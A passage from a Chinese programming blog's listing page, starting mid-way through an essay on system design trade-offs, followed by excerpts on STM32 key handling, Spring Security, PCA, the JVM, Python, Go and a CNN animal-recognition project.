在这个过程中，我们会发现，系统设计更多的是一种选择和妥协。其实小到一件事情，大到人生抉择，无外乎都是在选择和妥协中寻找一种平衡点。做系统设计也一样。所以了解架构评估的同学肯定会想到架构评估中的一种j经典评估方法，ATAM(架构权衡评估方法).。此处不做赘述。
有的观点可能是基于作者的经历整理，可能存在局限性，大家可以求同存异。不喜可以略过后面的了
1. 妥协：寻找平衡点 那么我们如何做到妥协，寻找到合适的平衡点呢 系统设计的目标众多，包括但不仅限于功能、性能、健壮性、开发周期、交付日期等。这些目标往往很多时候是矛盾的。不要一上来就说你的服务如何划分，你的健壮性如何稳定，你打算做的技术选型多么先进，不要认为自身已经学了很多主流的架构设计和各种技术架构，就能搞成很优秀的系统，永远不要追求所谓的什么优秀，除非单纯的是为了KPI。因为优秀只是可以讲出来的炫耀。而真正合适才是系统设计最终要表达的。
例如，你可能会发现，提高软件性能往往会导致开发周期的延长、交付日期的推迟；盲目地增加功能可能会导致性能降低、维护成本增加。这时，我们需要在这些众多的目标中找到一个平衡点，明确知道如何设计能实现这个平衡。这个平衡点应该是公司或客户都能接受的。在可行性分析阶段，我们通常会论述这样一个平衡点。但是，如果我们发现没有这样一个平衡点，那么我们可能需要重新思考需求，提出放弃某个方面的过度要求，否则系统将很可能失败。
甚至我们如果做项目，我们评估的工时为300人天，根据目前的资源评估，需要2个月交付。但是客户要求1个月内交付。这种情况下，我们如何做系统设计。通常一般供应商标准的如下
减少功能复杂度风险评估寻求外包或合作调整开发计划项目组加班工作 .通常还有一种策略叫做客户教育。其实就是向客户解释为什么项目需要300人天的工作量，并且你需要列举出很多权衡点。让他们理解项目复杂性和所需工作量之间的关系，以及为什么压缩进度可能会影响交付结果，把权衡点的妥协达成变成和客户一起完成的，这样客户的期待和项目本身的预期在前期就有了共识。
2. 学习 了解和选择解决方案
系统设计是一个复杂的过程，需要深厚的专业知识和丰富的实践经验。需要了解各种可以解决问题的方案，并清楚知道各个方案的效果、成本、缺点，以及这些方案的区别，然后从中作出最佳选择。这不是一个人能在一两天内完成的，需要长时间的学习和实践。
3. 借鉴 站在巨人的肩膀上
我们常常需要参考其他与目标系统相类似的系统，对其中的内容进行筛选、取舍和补充，以此作为新系统的设计。这并不是因为我们缺乏创新，而是因为我们需要站在巨人的肩膀上，借鉴前人的经验和智慧，避免重复犯错误。
4. 规律 系统设计的几个要点
尽管系统设计的过程中充满了困扰和挑战，但是也并非没有规律可循。我发现，优秀的系统设计通常在以下几个方面表现出色：
组件的独立性。审视自己设计的系统，是否做到了高内聚、低耦合？例外的识别和处理。我们不能期待用户会完全按照说明书操作，系统应该能够正确处理各种例外情况。防错和容错。当网络中断、数据库崩溃这样的灾难性事件发生时，我们的系统也能稳定运行吗？ 此外，我也发现了一些技术和方法能够有效改进系统设计，包括降低复杂性、通过合约进行设计、原型化设计、错误树分析等。
总的来说，系统设计是一项挑战和机遇并存的工作。我希望，通过分享我的一些想法和经验，能够帮助到正在走在这条路上的你。让我们一起在实践中学习，一起在挑战中成长，成为优秀的系统设计师。
从需求到表示的艺术 软件设计是一门结合技术与艺术的学问，它要求我们将抽象的软件需求转化为具体的软件表示形式。这个过程像是在绘制一幅蓝图，我们最初描绘出软件的总体框架，然后逐步细化，直至在这个框架中填满每一个细节。通过这样的艺术创作，我们才能实现功能强大、性能优异、用户友好的软件产品。让我们来共同探讨软件设计的两个阶段以及一些主要的设计方法。
软件设计的两个阶段 从工程管理的角度来说，我观察到软件设计过程中可以明显区分出两个阶段：
概要设计：也被称为高层设计。在这一阶段，设计师的任务是将软件需求转化为数据结构和软件的系统结构。如果我们采用的是结构化设计方法，那么我们会从一个宏观的角度将软件划分成各个组成模块，并且确定这些模块的职责以及模块之间的调用关系。这一步骤的完成标志着软件设计的框架已经搭建完成。
详细设计：亦称为低层设计。这一阶段，我们对概要设计中的结构表示进行更进一步的细化，这包括定义详细的数据结构以及算法的实现方式。在此基础上，如果还是采用结构化设计，那么详细设计的任务就是为每一个模块具体化设计，确保整个系统的每个部分都有明确和可执行的设计方案。
主要的设计方法比较 在结构化设计方法盛行的年代，设计师们有多种设计技术可以选择。其中包括Jackson方法和Parnas方法。结构化设计方法强调模块的独立性和功能的单一性，致力于使模块间的联系尽量弱化而模块内部的联系紧密。而Jackson方法的独到之处在于，它从数据结构出发，导出相应的模块结构。Parnas方法则把重点放在抽象的概念上，其核心思想是封装变化，将容易变化的因素隐藏在模块内部，这样当这些因素发生变化时，对系统的影响可以被局限在最小范围。Parnas方法给出了一些重要的设计准则，虽然它没有提供具体的工作步骤，但它的影响仍然深远。
而在近年来，随着对象技术的崛起，这一方法凭借其对数据的高效封装能力和良好的消息机制，实现了高内聚、低耦合的系统设计，逐渐成为现代软件设计的主流方法学。对象技术不仅促进了软件模块化，而且还提高了代码的重用性，使得软件开发更加高效、系统更加稳定。
在软件设计的世界里，无论是传统的结构化方法还是现代的对象技术，都有其独特的价值和适用场景。作为设计师，我们需要根据项目的具体需求、团队的技术背景以及项目的预算情况来选择最合适的设计方法，以确保软件设计的成功。最终，无论我们采取哪种方法，软件设计的本质始终是将用户的需求转化为一个可以工作的软件系统，这是一个既需要科学性也需要创造性的挑战过程。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/025aeeac858c20b48be1df5118f26ecc/" rel="bookmark">
			以STM32为例，实现按键的短按和长按
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以STM32为例，实现按键的短按和长按 目录 以STM32为例，实现按键的短按和长按1 实现原理2 实现代码3 测试结束语 1 实现原理 简单来说就是通过设置一个定时器来定时扫描几个按键的状态，并分别记录按键按下的持续时间，通过时间的长短就可以判断出是长按还是短按。
本文硬件接线图如下：
2 实现代码 1、key.h
主要是一些按键引脚以及后面需要使用的变量定义。
#ifndef __KEY_H #define __KEY_H	#include "sys.h" #define KEY1_PORT GPIOE #define KEY1_PIN GPIO_Pin_4 #define KEY2_PORT GPIOE #define KEY2_PIN GPIO_Pin_3 #define KEY3_PORT GPIOE #define KEY3_PIN GPIO_Pin_2 #define KEY4_PORT GPIOA #define KEY4_PIN GPIO_Pin_0 // 按键引脚定义 typedef struct { GPIO_TypeDef* port; // GPIOx uint16_t pin; // GPIO PINx uint16_t pressed_state; // 按键按下时的状态，0：按下时为低电平，1：按下时为高电平 }key_gpio_t; // 按键状态 typedef enum { KEY_RELEASE, // 释放松开 KEY_CONFIRM, // 消抖确认 KEY_SHORT_PRESSED, // 短按 KEY_LONG_PRESSED, // 长按 }key_status_t; // 按键事件 typedef enum { EVENT_NULL, EVENT_SHORT_PRESSED, EVENT_LONG_PRESSED, }key_event_t; typedef struct { key_status_t current_state; // 按键当前状态 uint32_t pressed_time; // 按下时间 key_event_t key_event; // 按键事件 }key_param_t; uint8_t read_key_state(uint8_t index); uint8_t key_scan(void); void key_handle(void); void key_timer_init(void); void key_gpio_init(void); void key_init(void); #endif 2、key.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/025aeeac858c20b48be1df5118f26ecc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02da59641912b3cc16dc4aa86efb3e11/" rel="bookmark">
			Spring Security及若依安全实现，Java小白入门（九）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 一个系统总会遇到安全，权限的问题，并且一坨坨的术语，让人恼火；更恼火的是官方一坨坨的代码实现，理不清剪不断；最最恼火的是你还得重新注入自己的一些实现，比如个性话的用户、个性化的权限，不得不重写一些接口和实现。最好的办法是，大概理清它们在哪里，然后，不至于想实现的时候找不到路径，那么一起看看spring security的基本原理和实现，以及若依又如何使用的，才会到以后该如何自己整一套。 Spring Security简介 Spring Security 最早叫 Acegi Security， 这个名称并不是说它和 Spring 就没有关系，它依然是为Spring 框架提供安全支持的。Acegi Security 基于 Spring，可以帮助我们为项目建立丰富的角色与权限管理系统。Acegi security 虽然好用，但是最为人诟病的则是它臃肿烦琐的配置这一问题最终也遗传给了 Spring Security。Acegi Security 最终被并入 Spring Security 项目中，并于 2008 年4月发布了改名后的第一个版本 Spring Security 2.0.0，到目前为止，Spring Security 的最新版本己经到了 5.6.1。和 Shiro 相比，Spring Security重量级并且配置烦琐，直至今天，依然有人以此为理由而拒绝了解 Spring Security。其实，自从 Spring Boot 推出后，就彻底颠覆了传统了 JavaEE 开发，自动化配置让许多事情变得非常容易，包括 Spring Security 的配置。在一个 Spring Boot 项目中，我们甚至只需要引入一个依赖，不需要任何额外配置，项目的所有接口就会被自动保护起来了。在 Spring Cloud中，很多涉及安全管理的问题，也是一个 Spring Security 依赖两行配置就能搞定，在和 Spring 家族的产品一起使用时，Spring Security 的优势就非常明显了。 整体架构 通过上一节，对于基本术语我们比较熟悉了，核心就是认证和授权，您是谁，您有什么权利，这两个看着有点相似的词一定区分好，Authentication （认证）,Authorization（授权）,AuthenticationManager 主要实现类为 ProviderManager，在 ProviderManager 中管理了众多 AuthenticationProvider 实例。很明显，可以有多个provider，允许有多种认证方式。SecurityContextHolder 用来获取登录之后用户信息。AccesDecisionVoter 和 AccessDecisionManager 都有众多的实现类，在 AccessDecisionManager 中会换个遍历 AccessDecisionVoter，进而决定是否允许用户访问，因而 AaccesDecisionVoter 和 AccessDecisionManager 两者的关系类似于 AuthenticationProvider 和 ProviderManager 的关系。 基本原理 在 Spring Security 中 认证、授权 等功能都是基于过滤器完成的。需要注意的是，默认过滤器并不是直接放在 Web 项目的原生过滤器链中，而是通过一个 FlterChainProxy 来统一管理。Spring Security 中的过滤器链通过 FilterChainProxy 嵌入到 Web项目的原生过滤器链中。FilterChainProxy 作为一个顶层的管理者，将统一管理 Security Filter。FilterChainProxy 本身是通过 Spring 框架提供的 DelegatingFilterProxy 整合到原生的过滤器链中。 Security Filters 可以看出，Spring Security 提供了 30 多个过滤器。默认情况下Spring Boot 在对 Spring Security 进入自动化配置时，会创建一个名为 SpringSecurityFilerChain 的过滤器，并注入到 Spring 容器中，这个过滤器将负责所有的安全管理，包括用户认证、授权、重定向到登录页面等。SpringBootWebSecurityConfiguration这个类是 spring boot 自动配置类，通过这个源码得知，默认情况下对所有请求进行权限控制: 中间省略一坨坨的逻辑分析，spring security 会到usreDetailService, 也就是及时没有持久化，也能看到登录 绕了很多，我们回到如何自定义的认证以及自定义的授权，划重点，WebSecurityConfigurerAdapter 扩展 Spring Security 所有默认配置 会用这个就可以，不能再看多了，越看越乱，不如我们看若依是如何实践这个内容的。 若依的安全 安全的配置 @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter 里面的细节都要挨着读一读的，看代码最有意思 若依登陆过程及过滤器拦截器的使用：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02da59641912b3cc16dc4aa86efb3e11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11594e222eda6cf75e9446561ad67f94/" rel="bookmark">
			降维算法的简单介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		降维算法 降维算法： 通过减少数据的维度，如主成分分析和 t-分布邻域嵌入等。
降维通俗的讲，是通过减少数据的维度来处理高维数据的过程。降维算法有助于消除数据中的冗余信息，减少噪声，并提高计算效率。以下是一些常见的降维算法：
1.主成分分析（Principal Component Analysis，PCA）： 原理： 将数据投影到一个新的坐标系，使得数据在新坐标系中的方差最大。 特点： 通过选择主成分（新坐标系的基向量）来达到降维的效果，适用于线性数据。 算法流程图： 标准化数据： 对原始数据进行标准化，使每个特征的均值为0，方差为1。 计算协方差矩阵： 计算标准化后的数据的协方差矩阵。 计算特征值和特征向量： 对协方差矩阵进行特征值分解，得到特征值和对应的特征向量。 选择主成分： 选择最大的k个特征值对应的特征向量，构成投影矩阵。 投影： 将标准化后的数据投影到选定的主成分上，得到降维后的数据。 import numpy as np from sklearn.decomposition import PCA import matplotlib.pyplot as plt # 生成示例数据 np.random.seed(42) data = np.random.rand(100, 2) * 10 # 使用PCA算法 pca = PCA(n_components=1) pca_result = pca.fit_transform(data) # 可视化原始数据和主成分 plt.scatter(data[:, 0], data[:, 1], label='Original Data', alpha=0.5) plt.scatter(pca.components_[0, 0], pca.components_[0, 1], color='red', label='Principal Component', marker='^', s=200) plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11594e222eda6cf75e9446561ad67f94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4161ce93a0ef2acbb51ab1ab69c7307/" rel="bookmark">
			jvm虚拟机初识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JVM Java虚拟机就是二进制字节码的运行环境，负责装载字节码到其内部，解释/编译为对应平台上的机器指令执行。每一条Java指令，Java虚拟机规范中都有详细定义，如怎么取操作数，怎么处理操作数，处理结果放在哪里。
特点：
一次编译，到处运行自动内存管理自动垃圾回收功能 JVM的位置 JVM是运行在操作系统之上的，它与硬件没有直接的交互
JVM整体结构 Java虚拟机（JVM）是一个包含多个组件的运行时环境。其核心组件包括类加载子系统、运行时数据区、执行引擎、本地接口和本地方法库。类加载子系统负责加载Java类，而运行时数据区包括方法区和堆，堆又分为新生代和老年代。执行引擎负责解释和执行Java字节码，同时具备即时编译器提高性能。本地接口允许Java代码与本地代码进行交互，而本地方法库包含与底层操作系统相关的本地方法。这些组件协同工作，使得Java程序能够在不同平台上高效运行。
- **Class Loader Subsystem（类加载子系统）** - Bootstrap Class Loader - Extension Class Loader - Application Class Loader - **Runtime Data Area（运行时数据区）** - **Method Area（方法区）** - **Heap（堆）** - New Generation（新生代） - Eden Space（伊甸区） - Survivor Spaces (S0, S1)（幸存者区） - Old Generation（老年代） - PermGen / Metaspace（永久代 / 元空间） - **Execution Engine（执行引擎）** - **Interpreter（解释器）** - **Just-In-Time (JIT) Compiler（即时编译器）** - **Garbage Collector（垃圾收集器）** - **Native Interface（本地接口）** - Native Method Interface（本地方法接口） - **Native Method Libraries（本地方法库）** Java代码执行流程 Java 源码编写
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4161ce93a0ef2acbb51ab1ab69c7307/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16a18ec52a2368acc8f5d031aeaad14f/" rel="bookmark">
			【编程语言】Python基础知识整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python基础目录 一、Python基础语法 1. 注释方法2. 关键字3. 标识符4. 变量5. 数据类型 （1）整型（2）浮点型（3）布尔型（4）字符串（5）列表（6）元组（7）字典（8）集合 6. 转换数据常用方法7. 数据容器的通用操作8. 运算符9. 输入输出10. 条件语句11. 循环语句 二、函数 1. 定义函数2. 调用函数3. 函数参数4. 函数返回值5. 函数说明文档6. 变量作⽤域7. 变量值的引用8. lambda表达式9. 高阶函数 一、Python基础语法 版本：Python 3.7 1. 注释方法 单行注释：# 注释内容（快捷键：Ctrl+ /）多行注释：''' 注释内容 ''' 或 """注释内容""" 2. 关键字 关键字一共33个，False、None和True的首字母大写，其他全部是小写
3. 标识符 1、标识符的命名规则（必须遵守）
由数字、字⺟、下划线_组成不能数字开头不能使⽤内置关键字严格区分⼤⼩写 2、标识符的命名规范（建议遵守）
⻅名知意⼤驼峰：即每个单词⾸字⺟都⼤写，例如： XxxYyyy⼩驼峰：第⼆个（含）以后的单词⾸字⺟⼤写，例如： xxxYyy下划线：例如： xxx_yyy 4. 变量 1、 单个变量赋值
变量名 = 值
2、 多个变量赋值
变量名1,变量名2,变量名3 = 值1，值2，值3
3.、多变量赋相同值
变量名1 = 变量名2 = 变量名3 = 值
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16a18ec52a2368acc8f5d031aeaad14f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90023f040f7946607bc6cf92de8c7b4a/" rel="bookmark">
			golang 如何判断变量的类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一 package main import ( "fmt" ) func main() { v1 := "123456" v2 := 12 fmt.Printf("v1 type:%T\n", v1) fmt.Printf("v2 type:%T\n", v2) } output:
v1 type:string v2 type:int
方法二 package main import ( "fmt" "reflect" ) func main() { v1 := "123456" v2 := 12 // reflect fmt.Println("v1 type:", reflect.TypeOf(v1)) fmt.Println("v2 type:", reflect.TypeOf(v2)) } output:
v1 type:string v2 type:int
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33dfca04934c8c969d73abca0abae2f4/" rel="bookmark">
			大创项目推荐 深度学习动物识别 - 卷积神经网络 机器视觉 图像识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言1 背景2 算法原理2.1 动物识别方法概况2.2 常用的网络模型2.2.1 B-CNN2.2.2 SSD 3 SSD动物目标检测流程4 实现效果5 部分相关代码5.1 数据预处理5.2 构建卷积神经网络5.3 tensorflow计算图可视化5.4 网络模型训练5.5 对猫狗图像进行2分类 6 最后 0 前言 🔥 优质竞赛项目系列，今天要分享的是
🚩 深度学习动物识别 - 卷积神经网络 机器视觉 图像识别
该项目较为新颖，适合作为竞赛课题方向，学长非常推荐！
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：4分 🧿 更多资料, 项目分享：
https://gitee.com/dancheng-senior/postgraduate
1 背景 目前，由于计算机能力和相关理论的发展获得了重大突破，基于深度学习的图像检测与识别技术已经广泛应用到人们的生产生活中。学长将深度学习的技术应用到野生动物图像识别中，优化了传统的识别方法，形成对野生动物图像更为准确的识别，为实现高效的野生动物图像识别提供了可能。不同于传统的野生动物识别，基于深度学习的野生动物识别技术可以捕获到野生动物更加细致的信息，有利于对野生动物进行更加准确的识别和研究。因此，对基于深度学习的野生动物识别和研究，可以更好的帮助社会管理者和政府全面有效的对野生动物进行保护和监管，这也正是保护和识别野生动物的关键，同时这对整个自然和社会的和谐发展具有极大的推动作用。
2 算法原理 2.1 动物识别方法概况 基于人工特征的野生动物识别方法主要通过人工对野生动物图像中具有辨识度的特征信息进行提取，并通过特征比对的方式就可以对野生动物所属的类别进行识别判断。
在深度学习技术普及之前，传统的数字图像处理技术与传统机器学习技术一直是研究的热点。传统的数字图像处理技术有模块分割、降低噪声点、边缘检测等方法。传统的机器学习技术有支持向量机、随机森林算法、BP
神经网络算法等。
深度学习技术是通过计算机模拟人类大脑的分层表达结构来建立网络模型，从原始数据集中对相关信息逐层提取。之后通过建立相应的神经网络对数据进行学习和分析，从而提高对目标预测和识别的准确率。如今，深度学习技术已经相对成熟，在对目标进行特征提取方面，卷积神经网络技术逐渐取代了传统的图像处理技术，并且在人类的生产生活中得到了广泛应用，这为研究野生动物更高效的识别方法奠定了基础。
2.2 常用的网络模型 图像识别是指对原始图像进行整体分析来达到预测原始图像所属类别的技术。计算机视觉领域中对图像识别技术进行了优化，与此同时，深度学习技术也对图像识别领域展开了突破。目前在图像识别领域中，研究人员开始使用深度学习的技术，并通过在实际应用中发现，基于深度学习的识别技术比传统的识别技术效果更好，且更具有优势。
2.2.1 B-CNN 双线性卷积神经网络(Bilinear
CNN，B-CNN)[34]是用两个卷积神经网络对图像进行特征提取，然后使用相应的函数将得到所有特征进行组合，组合的数据带入到分类器中进行分类。
2.2.2 SSD 经典的 SSD 模型是由经典网络和特征提取网络组成。
通过引入性能更好的特征提取网络对 SSD
目标检测模型进行了优化。Fu[49]等人提出了增加卷积神经网络层数和深度的方法用于提高识别准确率。通过实际应用之后，发现该方法识别准确率确实得到了一定程度的提高，但是模型结构却越来越复杂，同时对深层次的网络训练也越来越困难。
3 SSD动物目标检测流程 学长首先对 DenseNet-169 网络进行初始化，使用 DenseNet-169 网络作为目标检测的前置网络结构，并运用迁移学习的方法对
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33dfca04934c8c969d73abca0abae2f4/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/38/">«</a>
	<span class="pagination__item pagination__item--current">39/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/40/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>